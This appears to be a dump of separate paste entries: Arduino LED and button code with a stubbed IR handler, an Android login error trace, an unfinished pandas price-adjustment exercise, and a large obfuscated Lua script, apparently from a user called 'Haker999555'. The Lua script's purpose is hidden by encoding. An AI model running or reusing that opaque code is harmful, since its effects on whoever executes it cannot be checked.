	- Source Code NOT compiled for: Arduino Nano
	- Source Code created on: 2025-04-17 20:00:42

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* The system shall control an LED based on the state */
	/* of a push button, turning the LED on when the */
	/* button is pressed and off when released, ensuring */
	/* responsive feedback for user interactions. */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/
#include <FastLED.h>
#include <IRremote.h>
#include <EEPROM.h>

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);
void handleIrCommand(unsigned long command);
void setAllLeds(CRGB color);
int adjustValue(int value, long command);
void updateLeds();
void ledChase();
void blinkLeds();
void playBuzzer(int value);
void handleButtonPress(); // New function prototype for button handling

/****** CONSTANTS AND VARIABLES *****/
#define NUM_LEDS 40
#define DATA_PIN 4
#define IR_PIN 2
#define BUTTON_PIN 3 // Pin for the push button
#define EEPROM_BRIGHTNESS_ADDR 0
#define BUZZER_PIN 10 // Pin for the buzzer

CRGB leds[NUM_LEDS];
IRrecv irrecv(IR_PIN);
decode_results results;

int redValue = 0;
int greenValue = 0;
int blueValue = 0;
int brightness = 125;
bool ledsOn = false;
bool redMode = false;
bool greenMode = false;
bool blueMode = false;
bool blinking = false;
unsigned long previousBlinkTime = 0;
unsigned long previousChaseTime = 0;
const long blinkInterval = 500;
const long chaseInterval = 500;
int chasingLed = NUM_LEDS - 1;
bool isChasing = false;
CRGB chasingColor;
CRGB originalColors[NUM_LEDS];

void setup(void) {
  // put your setup code here, to run once:
  FastLED.addLeds<WS2812B, DATA_PIN, GRB>(leds, NUM_LEDS);
  FastLED.setBrightness(brightness);
  irrecv.enableIRIn();
  brightness = EEPROM.read(EEPROM_BRIGHTNESS_ADDR);
  if (brightness == 255) {
    brightness = 125;
  }
  pinMode(BUZZER_PIN, OUTPUT);
  pinMode(BUTTON_PIN, INPUT_PULLUP); // Set button pin as input with pull-up resistor
}

void loop(void) {
  // put your main code here, to run repeatedly:
  if (irrecv.decode(&results)) {
    handleIrCommand(results.value);
    irrecv.resume();
  }
  handleButtonPress(); // Check the button state
  if (blinking) {
    blinkLeds();
  }
  if (isChasing) {
    ledChase();
  }
}

void handleButtonPress() {
  // Read the button state
  if (digitalRead(BUTTON_PIN) == LOW) { // Button is pressed
    setAllLeds(CRGB::Red); // Turn on LED
    ledsOn = true; // Update the LED state
  } else { // Button is released
    setAllLeds(CRGB::Black); // Turn off LED
    ledsOn = false; // Update the LED state
  }
}

void handleIrCommand(unsigned long command) {
  switch (command) {
    // Existing IR command handling code...
    // (No changes made to existing IR commands)
    // ...
  }
  // Existing code for adjusting RGB values and updating LEDs...
  // ...
}

void setAllLeds(CRGB color) {
  for (int i = 0; i < NUM_LEDS; i++) {
    leds[i] = color;
  }
  FastLED.show();
  if (!ledsOn) {
    EEPROM.write(EEPROM_BRIGHTNESS_ADDR, brightness);
  }
  playBuzzer(color.r + color.g + color.b); // Buzzer based on RGB values
}

int adjustValue(int value, long command) {
  if (command == 0xFF629D) {
    return constrain(value + 10, 0, 255);
  } else {
    return constrain(value - 10, 0, 255);
  }
}

void updateLeds() {
  for (int i = 0; i < NUM_LEDS; i++) {
    leds[i] = CRGB(redValue, greenValue, blueValue);
  }
  FastLED.show();
  if (!ledsOn) {
    EEPROM.write(EEPROM_BRIGHTNESS_ADDR, brightness);
  }
}

void ledChase() {
  unsigned long currentMillis = millis();
  if (currentMillis - previousChaseTime >= chaseInterval) {
    previousChaseTime = currentMillis;
    leds[chasingLed] = CRGB::Black;
    chasingLed = (chasingLed - 1 + NUM_LEDS) % NUM_LEDS;
    leds[chasingLed] = chasingColor;
    FastLED.show();
    if (chasingLed == NUM_LEDS - 1) {
      isChasing = false;
    }
  }
}

void blinkLeds() {
  unsigned long currentMillis = millis();
  if (currentMillis - previousBlinkTime >= blinkInterval) {
    previousBlinkTime = currentMillis;
    for (int i = 0; i < NUM_LEDS; i++) {
      if (leds[i].r || leds[i].g || leds[i].b) {
        leds[i] = CRGB::Black;
      } else {
        leds[i] = originalColors[i];
      }
    }
    FastLED.show();
  }
}

void playBuzzer(int value) {
  int frequency = map(value, 0, 255, 100, 2000); // Map value to audible frequency
  tone(BUZZER_PIN, frequency, 50); // Generate tone for 50 ms
}

/* END CODE */"
dtTgfSWb,Untitled,Haker999555,Lua,Thursday 17th of April 2025 02:58:23 PM CDT,"--[[ v1.0.0 https://wearedevs.net/obfuscator ]] return(function(...)local F={""\050\051\070\113\052\051\050\076\081\105\104\053\109\051\050\111\109\051\050\118\081\049\061\061"";""\055\099\069\069\052\106\061\061"",""\082\099\088\061"",""\052\051\087\069\068\051\043\061"";""\109\051\108\119\109\089\116\085\121\117\081\061"";""\117\116\108\103\055\043\061\061"";""\121\110\054\084\068\073\081\061"";""\089\122\079\056\104\099\069\110\068\101\121\074\122\100\050\085\109\106\061\061"",""\104\117\098\055\089\110\050\085\075\101\104\103\065\089\109\116\082\103\118\061"",""\109\051\070\085\068\051\122\061"",""\074\107\065\113\081\122\107\089\103\102\108\072\087\054\072\107\112\052\047\118\085\086\088\086\122\122\072\085\082\090\122\089\067\099\080\070\103\104\114\084\084\110\108\070\103\067\077\112\098\076\048\112\077\052\101\086\109\114\085\050\122\101\090\076\117\072\102\108\053\110\114\089\066\078\055\090\073\051\110\054\068\108\072\090\104\107\052\051\110\103\117\115\084\074\051\118\065\068\113\111\105\106\049\075\072\110\083\100\115\103\081\118\055\083\066\104\049\083\047\068\067\108\056\054\078\057\068\108\101\116\079\050\119\101\077\076\100\049\048\116\080\122\050\107\051\110\048\102\081\089\088\053\056\102\112\097\111\053\075\077\079\043\061\061"",""\056\106\061\061"",""\068\101\105\061"",""\082\100\104\078\052\105\109\053\109\107\061\061"",""\055\103\053\078\121\049\061\061"",""\122\111\109\087\050\122\050\121\089\089\121\100\082\051\070\072"";""\052\069\076\090\052\107\067\105\056\056\074\106\100\098\088\061"",""\068\101\081\061"",""\055\110\113\097\050\053\121\121\104\118\053\055\082\089\054\050\065\110\118\061"",""\056\085\106\053\121\120\057\098\056\106\061\061"",""\117\116\108\088\121\089\102\061"",""\087\117\121\079\121\101\104\120\115\100\050\057\049\050\069\105"";""\050\117\087\053\052\110\114\069\068\089\122\061"",""\052\118\053\098\087\089\050\087\075\111\074\098\065\070\074\043\052\100\118\061"";""\050\099\050\085\065\051\108\084\065\043\061\061"";""\121\117\079\076\068\073\081\061"",""\121\073\087\116\055\106\061\061"",""\055\099\108\119\055\099\070\078"";""\050\051\053\089\121\101\079\121\082\097\049\073\065\116\070\074"";""\052\073\104\076\065\089\114\103"";""\050\100\070\101\050\122\121\079\075\099\114\112\055\089\113\083\083\103\083\061"";""\109\089\114\043\055\089\087\072"",""\052\110\070\119\121\051\108\113"";""\052\099\050\078\068\089\050\078\055\117\104\069\055\110\054\053"";""\052\110\050\113\068\073\121\053"",""\068\089\070\078\065\107\061\061"",""\068\051\050\119"";""\068\051\108\069\121\100\087\078\052\110\053\119\121\043\061\061"",""\109\116\069\054\122\097\104\069\082\097\050\055\050\110\113\088\052\118\106\061"";""\117\116\108\098\068\110\104\053\115\107\061\061"";""\121\099\116\069\109\051\087\057"";"""",""\050\117\087\053\052\110\114\069\068\089\122\076"";""\121\099\070\113\121\049\061\061"";""\055\118\053\072\068\110\070\100\082\103\098\078\082\053\106\043"";""\113\043\048\121\050\082\052\103\116\106\051\088\080\113\078\061"";""\115\101\070\055\121\097\050\101\050\053\098\087\082\103\087\084\050\043\061\061"";""\050\075\079\117\056\117\055\102\121\100\109\105\109\110\054\043\122\117\105\061"",""\087\051\108\088\068\075\079\087\050\099\106\116\052\103\070\079\075\049\061\061"",""\088\051\079\105\120\122\119\109\068\057\106\115\105\084\089\089\074\088\100\066\120\106\069\114\069\051\097\065\108\067\065\097\076\080\069\087\072\053\083\099\105\105\066\052\048\100\105\069\114\081\089\108\118\077\114\104\087\080\074\079\053\104\090\114\114\079\050\085\120\109\067\081\104\115\107\078\053\065\112\055\068\055\048\079\116\097\082\085\119\110\088\073\105\075\078\050\105\087\050\106\113\075\097\121\097\049\051\085\083\068\065\050\056\070\108\048\110\070\067\109\043\116\116\055\048\100\098\103\122\102\078\061"";""\117\116\108\113\121\117\104\069\109\051\070\085\068\051\122\061"",""\109\051\108\097\109\100\079\098\068\110\052\061"";""\052\117\087\050\082\075\069\073\089\118\087\121\089\118\053\053\055\106\061\061""}local function S(S)return F[S-(-717259+741103)]end for S,l in ipairs({{-865205-(-865206),66326+-66273},{-194826+194827;927269+-927252},{622573+-622555,-67447-(-67500)}})do while l[-523075+523076]<l[1038799-1038797]do F[l[-272211-(-272212)]],F[l[434754-434752]],l[-869389+869390],l[-784679+784681]=F[l[-204758-(-204760)]],F[l[-943947-(-943948)]],l[548657-548656]+(994322-994321),l[-246938-(-246940)]-(-497433+497434)end end do local S=string.char local l=type local o=F local V=math.floor local Q={j=-917586-(-917618);E=1035832+-1035799;V=730421+-730363,T=-128658-(-128705),f=-923598-(-923654),x=-355757+355759,D=-111229-(-111256),b=183407-183366,v=1023218+-1023182;[""\047""]=-443987+443997;L=-443793+443843,m=710468+-710439;P=-926642+926684;y=-335839+335864;[""\050""]=156810-156789;k=301737-301737,r=-178829-(-178886);X=-815916-(-815960),Q=-617776-(-617784),w=-851634+851680,c=-347759-(-347813);i=-598824-(-598828);z=-804296+804316,s=-878875-(-878905),N=225878-225826,B=-284815-(-284878),S=749079-749067;[""\057""]=446028-445988,a=-569515+569566;W=-240701-(-240714);[""\056""]=-812691+812705;G=466611+-466552;l=811866-811805;o=-99997+100032,K=40524+-40505;q=-854768-(-854813),n=-357777-(-357815),d=903404+-903397,A=-916384-(-916410),u=-596218-(-596241),M=-591652+591714,[""\054""]=535168-535119;[""\043""]=161854+-161806;h=-418627+418644;H=-305317+305360;I=-542445-(-542500);[""\052""]=43954+-43926;U=-117061+117095,Z=846433-846402;[""\048""]=-735890+735901;[""\055""]=-885290+885314,[""\053""]=-933678-(-933715);e=-599626+599629;p=-20313+20328;[""\051""]=34167+-34161;[""\049""]=898756-898740;R=785109+-785091,J=820084+-820083,Y=-551343+551365;F=1009673+-1009668;O=141667+-141658,C=-379259-(-379319);g=-983714-(-983753);t=-27855+27908}local J=string.len local n=string.sub local q=table.concat local x=table.insert for F=-173767+173768,#o,-889512+889513 do local W=o[F]if l(W)==""\115\116\114\105\110\103""then local l=J(W)local p={}local v=-595218-(-595219)local e=-555262-(-555262)local a=-26956-(-26956)while v<=l do local F=n(W,v,v)local o=Q[F]if o then e=e+o*(-531191-(-531255))^((-921266-(-921269))-a)a=a+(-368867-(-368868))if a==1037669-1037665 then a=744242-744242 local F=V(e/(-417303+482839))local l=V((e%(377311+-311775))/(976262+-976006))local o=e%(-752472-(-752728))x(p,S(F,l,o))e=643533-643533 end elseif F==""\061""then x(p,S(V(e/(213494-147958))))if v>=l or n(W,v+(-125177-(-125178)),v+(198941+-198940))~=""\061""then x(p,S(V((e%(-285664+351200))/(-298610-(-298866)))))end break end v=v+(69867+-69866)end o[F]=q(p)end end end return(function(F,o,V,Q,J,n,q,l,x,d,v,a,K,r,W,e,L,p,T,C)p,T,e,L,W,l,d,a,C,x,K,r,v=function()v=v+(124615-124614)W[v]=198715-198714 return v end,function(F,S)local o=e(S)local V=function(V,Q)return l(F,{V,Q},S,o)end return V end,function(F)for S=556825+-556824,#F,-940366-(-940367)do W[F[S]]=(280505-280504)+W[F[S]]end if V then local l=V(true)local o=J(l)o[S(-455884-(-479732))],o[S(-100073-(-123940))],o[S(-34386-(-58268))]=F,a,function()return-417725+-109108 end return l else return Q({},{[S(787903+-764036)]=a,[S(75193+-51345)]=F;[S(-139483-(-163365))]=function()return 369130-895963 end})end end,function(F,S)local o=e(S)local V=function(V,Q,J,n,q)return l(F,{V;Q;J;n,q},S,o)end return V end,{},function(l,V,Q,J)local t,y,C,k,P,G,O,Z,j,X,w,M,c,u,b,h,f,Y,s,E,A,a,R,m,W,q,U,g,D,v,I,e,H,N while l do if l<890074+8837226 then if l<4954819-(-865030)then if l<-288236+3178660 then if l<518381+231179 then if l<962407+-241789 then if l<-224689+918572 then if l<1282643-874674 then a=nil R=nil G=nil l=-509301+4996887 else c=p()x[c]=q l=x[R]f=-631298-(-631363)I=416727-416724 q=l(I,f)Y=S(818484+-794624)I=p()l=738674+-738674 x[I]=q f=l l=419346-419346 O=S(874502+-850637)q=F[O]w=l U=T(-62742+10750282,{})O={q(U)}q=-708274-(-708276)l={o(O)}O=l l=O[q]U=l q=S(-1013981-(-1037847))l=F[q]b=x[e]h=F[Y]Y=h(U)h=S(-413372-(-437253))N=b(Y,h)b={N()}q=l(o(b))b=p()x[b]=q q=-760417+760418 N=x[I]h=N N=-112432-(-112433)Y=N N=718369+-718369 l=563492+11228284 g=Y<N N=q-Y end else b=#O g=889403+-889403 U=b==g l=U and-258900+1445780 or-7740+10930776 end else if l<-306979+1036672 then v=x[Q[942379-942377]]l=9722422-952865 e=x[Q[867257-867254]]W=v==e q=W else P=S(-544188+568059)R=S(987746-963849)w=S(-169660-(-193531))G=q q=F[R]R=S(-961503+985397)l=q[R]R=p()x[R]=l q=F[P]P=S(-389281-(-413170))l=q[P]f=F[w]P=l c=f I=l l=f and 514163+16147367 or 13273560-(-224943)end end else if l<833250-(-741821)then if l<-322224+1351915 then x[v]=q l=-595624+10718257 else U={}b=p()x[b]=U g=r(-774679+13657066,{b,c,I,C})y=p()q={}U=p()x[U]=g g={}A=nil t={}l=F[S(-973383-(-997266))]u=S(-628602-(-652450))R=nil R=862446+17651065370413 x[y]=g a=nil D=S(-29117+53012)g=F[D]C=K(C)P=nil G=nil E=x[y]s=S(812037-788178)H={[u]=E,[s]=A}D=g(t,H)g=L(7111031-(-376049),{y;b,w;c,I,U})w=K(w)y=K(y)v=g e=D f=nil I=K(I)G=S(-538480+562358)U=K(U)b=K(b)c=K(c)U=-503674+20324207760498 C=v(G,R)O=nil c=15368318907327-415691 P=-930214+1278804751353 a=e[C]C=S(1036424+-1012540)R=S(-917216-(-941070))F[C]=a G=v(R,P)I=S(773203-749351)C=e[G]G=S(325987-302136)F[G]=C P=S(185419+-161547)R=v(P,c)G=e[R]P=S(-610261+634107)R=S(903336-879450)F[R]=G R=F[P]O=S(-607099-(-630957))c=F[I]w=v(O,U)f=e[w]w=S(498749+-474874)v=nil w=c[w]I={w(c,f)}e=nil P=R(o(I))R=P()end else if l<1895638-(-408161)then e=e+C v=e<=a R=not G v=R and v R=e>=a R=G and R v=R or v R=-995340+4976198 l=v and R v=6624295-(-191148)l=l or v else e=917220+-917215 v=x[Q[-874602-(-874604)]]W=v*e v=136159+25916586974020 q=W+v W=974775+35184371114057 l=q%W x[Q[-240853+240855]]=l v=-670792+670793 W=x[Q[-35415-(-35418)]]l=7142664-(-540695)q=W~=v end end end else if l<1034422+3194773 then if l<4021929-233769 then if l<592578+2797296 then if l<3847235-745468 then U=b t=U O[U]=t U=nil l=14623316-(-906774)else v=S(-508941-(-532831))e=-482689-(-1034961)W=v^e q=7973889-(-322202)l=q-W W=l q=S(-427707+451563)l=q/W q={l}l=F[S(417781-393889)]end else l=F[S(-594908+618763)]q={}end else if l<1013240+3079627 then v=e P=-444490-(-444490)l=x[Q[-483328-(-483329)]]c=455403-455148 R=l(P,c)l=2277590-44232 W[v]=R v=nil else A=-553360-(-553361)Z=s[A]l=13987178-(-181252)m=Z end end else if l<3764185-(-982534)then if l<885361+3748141 then l=F[S(820009+-796140)]q={v}else h=f==w l=806979+11255620 N=h end else if l<4706669-(-303485)then l=F[S(32428+-8548)]e=S(-913959+937830)v=F[e]e=S(-126409-(-150305))W=v[e]e=x[Q[1017922-1017921]]v={W(e)}q={o(v)}else l=true l=l and 6871253-304850 or 354378+14068788 end end end end else if l<6630591-(-895135)then if l<486204+6130093 then if l<-216003+6709290 then if l<244220+5994965 then if l<5175983-(-815583)then y=p()D=S(216776+-192879)s=392851+-392849 x[y]=N q=F[D]t=-462962+463062 D=S(-402573-(-426467))l=q[D]H=701564+-701309 D=-26813+26814 q=l(D,t)D=p()x[D]=q M=-432954-(-432954)t=946359+-946359 l=x[R]q=l(t,H)t=p()x[t]=q A=S(764218-740358)X=382097-372097 l=x[R]H=213932-213931 E=-764300-(-764301)u=x[D]q=l(H,u)H=p()x[H]=q q=x[R]u=q(E,s)s=S(894809+-870936)q=-438192+438193 l=u==q u=p()q=S(-73615-(-97496))x[u]=l Z=F[A]l=S(-816473+840361)j=x[R]k={j(M,X)}A=Z(o(k))Z=S(991925-968052)m=A..Z l=U[l]E=s..m l=l(U,q,E)E=p()s=S(847936+-824071)x[E]=l q=F[s]m=d(12891729-(-122480),{R,y,I,e;v;b;u;E;D,H;t;c})s={q(m)}l={o(s)}s=l l=x[u]l=l and-78827+10774046 or 13518606-649011 else k=-574180-(-574182)j=s[k]k=x[E]l=10752101-95298 A=j==k m=A end else l=4190383-(-297203)end else if l<-299153+6885324 then l=-273790+16875737 else e=-849936-(-849968)v=x[Q[354018-354015]]c=-278525+278527 W=v%e a=x[Q[315027+-315023]]f=-988283+988296 R=x[Q[985565+-985563]]U=x[Q[-133442-(-133445)]]O=U-W U=-623683-(-623715)w=O/U I=f-w P=c^I l=778387+4227445 G=R/P C=a(G)a=4294636251-(-331045)P=-383435-(-383436)e=C%a C=-623775-(-623777)a=C^W v=e/a f=-451914-(-452170)a=x[Q[-13669+13673]]W=nil R=v%P P=-197407+4295164703 G=R*P C=a(G)a=x[Q[493444+-493440]]G=a(v)e=C+G R=-553783+619319 C=-590821-(-656357)a=e%C G=e-a c=-79577-(-79833)C=G/R R=805492+-805236 G=a%R P=a-G R=P/c c=487780+-487524 v=nil P=C%c I=C-P C=nil c=I/f a=nil I={G,R,P,c}x[Q[-531073+531074]]=I c=nil e=nil R=nil G=nil P=nil end end else if l<6830668-59744 then if l<-133236+6868772 then Y=S(866195-842335)l=F[Y]y=S(409003+-385129)g=F[y]Y=l(g)l=S(-102473-(-126352))F[l]=Y l=832329+9853739 else l=true l=l and 9393878-(-224960)or-606905+15173266 end else if l<7946812-721203 then l=x[Q[1005455+-1005445]]v=x[Q[646218-646207]]W[l]=v l=x[Q[-316287+316299]]v={l(W)}l=F[S(-918069+941930)]q={o(v)}else l=x[Q[972561-972560]]W=V[-73125+73126]v=V[-922943-(-922945)]e=l l=e[v]l=l and 6996944-756991 or 10789561-(-142109)end end end else if l<9277842-895810 then if l<813048+7019075 then if l<1046429+6672109 then if l<7143927-(-524738)then I=I+f O=not w P=I<=c P=O and P O=I>=c O=w and O P=O or P O=218144+7518060 l=P and O P=899687-513914 l=l or P else e=-973505+973757 v=x[Q[-393647+393650]]l=-237786+11105520 W=v*e v=-499196-(-499453)q=W%v x[Q[-19308+19311]]=q end else P=I Y=S(386571-362680)h=F[Y]Y=S(398227+-374351)N=h[Y]h=N(W,P)N=x[Q[-250977-(-250983)]]Y=N()b=h+Y Y=475739-475738 U=b+G b=-738411+738667 O=U%b P=nil G=O b=e[v]h=G+Y N=a[h]l=7024506-(-508872)U=b..N e[v]=U end else if l<8010498-(-8584)then W=nil x[Q[-578778-(-578783)]]=q l=12274338-(-642225)else q=S(479850-455984)a=S(844304+-820444)l=F[q]c=T(-803924+4141198,{})W=x[Q[459327+-459323]]e=F[a]P=S(869502-845637)R=F[P]P={R(c)}R=-822355-(-822357)G={o(P)}C=G[R]a=e(C)e=S(452667-428786)v=W(a,e)W={v()}q=l(o(W))v=x[Q[988656-988651]]W=q q=v l=v and 10836000-(-11707)or 7576974-(-282789)end end else if l<8532869-(-70268)then if l<-761754+9244496 then l=x[R]g=498748-498742 Y=192873+-192872 h=l(Y,g)l=S(-163921+187800)g=S(615826-591947)F[l]=h Y=F[g]g=-200842+200844 l=Y>g l=l and 7297611-628236 or 978059+7505045 else g=S(1066142-1042263)l=F[g]g=S(225713+-201839)F[g]=l l=11502075-816007 end else if l<219968+9380776 then l=q and 86604+8229605 or 994927+11921636 else q=S(-1009440+1033319)W=S(-16156-(-40030))l=F[q]q=F[W]W=S(-365118+388992)F[W]=l W=S(-51579-(-75458))F[W]=q W=x[Q[-688718-(-688719)]]v=W()l=87949+6653654 end end end end end else if l<13343390-460958 then if l<904347+9966959 then if l<11295517-608269 then if l<-442714+10965429 then if l<-24342+10266850 then if l<10814989-890220 then l=true x[Q[468534-468533]]=l q={}l=F[S(-473565-(-497418))]else y=K(y)t=K(t)E=K(E)s=nil l=11629201-(-162575)H=K(H)u=K(u)D=K(D)end else U=nil I=K(I)b=K(b)w=nil P=nil C=K(C)f=nil I=p()R=K(R)O=nil G=nil f={}e=K(e)G=S(-239943-(-263840))v=K(v)O={}R=S(1047795+-1023898)e=nil v=nil C=F[G]l=16288632-758542 G=S(-471772-(-495640))P=S(680391-656520)c=K(c)a=K(a)b=118984+-118728 a=C[G]C=p()x[C]=a G=F[R]R=S(-374120-(-398014))a=G[R]R=F[P]c=S(598854-574963)g=b P=S(354889+-330993)G=R[P]P=F[c]c=S(832929+-809066)R=P[c]c=p()P=412567+-412567 x[c]=P U=858195-858194 P=972932+-972930 b=956831+-956830 x[I]=P y=b P={}w=p()x[w]=f b=1047975-1047975 D=y<b b=U-y f=-801804+801804 end else if l<10962696-292213 then l=Z l=-23061-(-981994)q=m else l=442255+16159692 end end else if l<-628070+11453384 then if l<825880+9864570 then v=S(-227354-(-251231))q=10552408-(-199778)e=832618+8019637 W=v^e l=q-W W=l q=S(866195+-842331)l=q/W q={l}l=F[S(360775+-336928)]else m=x[v]l=m and 13357431-463674 or 710208+248725 q=m end else if l<-98885+10959800 then e=x[Q[-877403-(-877409)]]v=e==W q=v l=-118345+7978108 else v=x[Q[768759+-768756]]e=312432-312431 W=v~=e l=W and 5847371-(-766559)or 286757+7396602 end end end else if l<375372+11519138 then if l<-124639+11670062 then if l<881248+10161252 then if l<9942939-(-983242)then g=#O b=-947619-(-947620)U=a(b,g)b=G(O,U)l=-512664+1218397 t=344987+-344986 g=x[w]D=b-t y=R(D)U=nil g[b]=y b=nil else R=103300-103045 l={}x[Q[696826-696824]]=l P=S(-720463+744354)q=x[Q[-220620-(-220623)]]a=q C=35184372672033-583201 q=v%C x[Q[-586827-(-586831)]]=q G=v%R R=-840502+840504 C=G+R x[Q[-1018527-(-1018532)]]=C R=F[P]P=S(560835+-536990)G=R[P]R=G(W)G=S(-374287-(-398137))c=R e[v]=G l=-172987+7706365 I=-159646-(-159647)f=I I=-167460-(-167460)G=-676958-(-677144)w=f<I P=531314+-531313 I=P-f end else G=x[C]q=G l=1038427+-308665 end else if l<12479907-685550 then N=N+Y y=not g q=N<=h q=y and q y=N>=h y=g and y q=y or q y=309176+5616589 l=q and y q=12467066-(-492340)l=l or q else W=S(809342+-785455)e=390855-390855 l=F[W]v=x[Q[287123+-287115]]W=l(v,e)l=-339904+13390998 end end else if l<12572009-(-238069)then if l<146281+12017348 then x[v]=N l=x[v]l=l and-804542+15100500 or 16566819-38642 else q=S(647325-623438)l=F[q]W=S(151364+-127502)q=l(W)l=F[S(-853540+877425)]q={}end else if l<-233794+13106949 then Z=x[v]l=Z and 3950928-(-251908)or-621485+14789915 m=Z else W=x[Q[123035+-123034]]q=#W W=107718+-107718 l=q==W l=l and 2746738-330806 or 5157089-151257 end end end end else if l<973802+13412528 then if l<12663379-(-636526)then if l<13690756-694339 then if l<12480254-(-463147)then if l<-486093+13383655 then Z=l k=-48688-(-48689)j=s[k]k=false A=j==k m=A l=A and 903027+5187418 or 10038889-(-617914)else l=x[Q[-901512-(-901519)]]l=l and 422577+11378306 or 13983284-932190 end else h=x[v]l=h and 4521822-(-205472)or 11367232-(-695367)N=h end else if l<12047200-(-972940)then a=469311+-469310 C=1022458-1022456 v=x[Q[-796138+796139]]e=v(a,C)v=962239-962238 W=e==v l=W and 9112914-343357 or 838517+-109145 q=W else l={}W=l e=x[Q[-322637-(-322646)]]a=e l=3265049-1031691 e=206435+-206434 v=-840146-(-840147)C=e e=1032730+-1032730 G=C<e e=v-C end end else if l<14058320-240303 then if l<14201143-633336 then l=I q=c l=c and 354869+322316 or 701342+15361307 else l=-1003821+11926857 b=#O g=-990546-(-990546)U=b==g end else if l<239769+13936671 then M=375855-375854 x[v]=m k=x[H]j=k+M A=s[j]Z=f+A A=340656+-340400 l=Z%A j=x[t]A=w+j j=761976-761720 Z=A%j f=l w=Z l=9673186-(-449447)else l=11088826-646518 end end end else if l<16691162-760715 then if l<424307+14380980 then if l<15532171-964793 then if l<14121792-(-405972)then l=d(-773548+15359763,{a})h={l()}l=F[S(597392+-573522)]q={o(h)}else l=F[S(-961269+985126)]q={}end else l=6280819-(-460784)end else if l<-590485+16066259 then v=p()W=V R=S(740274+-716409)l=true x[v]=l C=p()e=S(59498-35607)q=F[e]e=S(-759610+783459)l=q[e]a=p()P=T(-600099+10479297,{C})e=p()x[e]=l l=d(324625+12458605,{})x[a]=l l=false x[C]=l G=F[R]R=G(P)l=R and 10723597-(-621337)or 535668-(-194094)q=R else t=not D b=b+y U=b<=g U=t and U t=b>=g t=D and t U=t or U t=791661+2254131 l=U and t U=-579278+14161028 l=l or U end end else if l<857900+15678820 then if l<16077834-(-232398)then I=S(-7474+31367)l=1609235-932050 c=F[I]q=c else l=true l=15054+14408112 end else if l<-755153+17394657 then l=true l=l and-946821+9398623 or-399176+4010768 else O=S(314317-290446)w=F[O]O=S(391936-368043)f=w[O]l=403283+13095220 c=f end end end end end end end l=#J return o(q)end,function(F,S)local o=e(S)local V=function()return l(F,{},S,o)end return V end,function(F)local S,l=-977635-(-977636),F[-757982+757983]while l do W[l],S=W[l]-(629156-629155),S+(890612+-890611)if W[l]==-777864+777864 then W[l],x[l]=nil,nil end l=F[S]end end,function(F,S)local o=e(S)local V=function(...)return l(F,{...},S,o)end return V end,{},function(F)W[F]=W[F]-(-1004372+1004373)if W[F]==983970+-983970 then W[F],x[F]=nil,nil end end,function(F,S)local o=e(S)local V=function(V)return l(F,{V},S,o)end return V end,-891248+891248 return(C(15403554-(-53584),{}))(o(q))end)(getfenv and getfenv()or _ENV,unpack or table[S(-19725+43618)],newproxy,setmetatable,getmetatable,select,{...})end)(...)"
gtVBYDNz,2025-04-17T15:40:57.607360,powerampache,PHP,Thursday 17th of April 2025 02:40:57 PM CDT,"1.01-80-play.debug (80) - DB: 83
luci.sixsixsix.powerampache2.domain.errors.MusicException: {""errorAction"":""handshake"",""errorCode"":""4701"",""errorMessage"":""Received Invalid Handshake - Incorrect username or password"",""errorType"":""account""}
	at luci.sixsixsix.powerampache2.data.MusicRepositoryImpl.tryAuthorize(MusicRepositoryImpl.kt:268)
	at luci.sixsixsix.powerampache2.data.MusicRepositoryImpl.access$tryAuthorize(MusicRepositoryImpl.kt:83)
	at luci.sixsixsix.powerampache2.data.MusicRepositoryImpl$tryAuthorize$1.invokeSuspend(Unknown Source:18)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at android.os.Handler.handleCallback(Handler.java:991)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loopOnce(Looper.java:232)
	at android.os.Looper.loop(Looper.java:317)
	at android.app.ActivityThread.main(ActivityThread.java:8934)
	at java.lang.reflect.Method.invoke(Native Method)
	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:591)
	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:911)

authorize() - {""errorAction"":""handshake"",""errorCode"":""4701"",""errorMessage"":""Received Invalid Handshake - Incorrect username or password"",""errorType"":""account""}"
U908N4Cw,Databases,Korotkodul,Python,Thursday 17th of April 2025 02:39:21 PM CDT,"# Загрузка датасета с помощью kagglehub
import os
import pandas as pd
import kagglehub

# Загрузка последней версии датасета
path = kagglehub.dataset_download(""ersany/online-retail-dataset"")
print(""Path to dataset files:"", path)

# Чтение Excel-файла
df = pd.read_excel(os.path.join(path, ""Online Retail.xlsx""))
""""""
  InvoiceNo StockCode  ... CustomerID         Country
0    536365    85123A  ...    17850.0  United Kingdom
1    536365     71053  ...    17850.0  United Kingdom
2    536365    84406B  ...    17850.0  United Kingdom
3    536365    84029G  ...    17850.0  United Kingdom
4    536365    84029E  ...    17850.0  United Kingdom

[5 rows x 8 columns]

['InvoiceNo', 'StockCode', 'Description', 'Quantity', 'InvoiceDate', 'UnitPrice', 'CustomerID', 'Country']
""""""

""""""
Изменяем цены
объединить страны в группы по первой букве страны (Australia, Austria; Belgium, Brazil и тд)
В группе с первой буквой ""A"" поднять цену на максимальную цену товарав группе
В группе с первой буквой ""B"" цену уменьшить на половину минимальной
В остальных группах цены увеличить на 10% от текущей цены объекта
""""""
# Полная настройка отображения DataFrame
pd.set_option('display.max_columns', None)  # Все колонки
pd.set_option('display.expand_frame_repr', False)  # Не переносить на новую строку
pd.set_option('display.width', 1000)  # Ширина вывода
pd.set_option('display.max_colwidth', 20)  # Максимальная ширина колонки

#объединить страны в группы по первой букве страны (Australia, Austria; Belgium, Brazil и тд)
print(""RAW"")
print(df.columns.tolist())  # Вывод списка колонок
print(df.head())


def change_price(group):
    """"""Функция для изменения цен в соответствии с условиями""""""
    first_letter = group.name  # Здесь group.name - это первая буква (A, B и т.д.)

    if first_letter == 'A':
        # Для группы A: цена = максимальная цена в группе
        max_price = group['UnitPrice'].max()
        group['UnitPrice'] = max_price
    elif first_letter == 'B':
        # Для группы B: цена = текущая цена - половина минимальной цены группы
        min_price = group['UnitPrice'].min()
        group['UnitPrice'] = group['UnitPrice'] - (min_price / 2)
    else:
        # Для остальных групп: увеличиваем цену на 10%
